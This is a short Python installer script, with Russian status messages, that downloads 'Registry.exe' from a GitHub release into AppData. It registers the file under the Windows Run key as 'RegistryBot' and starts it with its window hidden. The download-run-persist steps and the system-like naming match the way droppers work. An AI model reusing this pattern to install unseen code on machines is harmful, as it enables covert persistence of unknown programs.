import os
import sys
import shutil
import subprocess
import winreg
import urllib.request

if getattr(sys, 'frozen', False):
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

INSTALL_DIR = os.path.join(os.environ.get("APPDATA", ""), "Registry")
BOT_URL = "https://github.com/fanti-scripts/instalsRegistry/releases/download/v1.0/Registry.exe"
BOT_DST = os.path.join(INSTALL_DIR, "Registry.exe")
AUTORUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
AUTORUN_NAME = "RegistryBot"


def install():
    os.makedirs(INSTALL_DIR, exist_ok=True)
    print(f"Скачивание Registry.exe...")
    urllib.request.urlretrieve(BOT_URL, BOT_DST)
    print("Установка в автозапуск...")
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, AUTORUN_KEY, 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, AUTORUN_NAME, 0, winreg.REG_SZ, f'"{BOT_DST}"')
    winreg.CloseKey(key)
    print("Готово!")


def run():
    subprocess.Popen([BOT_DST], cwd=INSTALL_DIR, creationflags=subprocess.CREATE_NO_WINDOW)


if __name__ == "__main__":
    install()
    run()
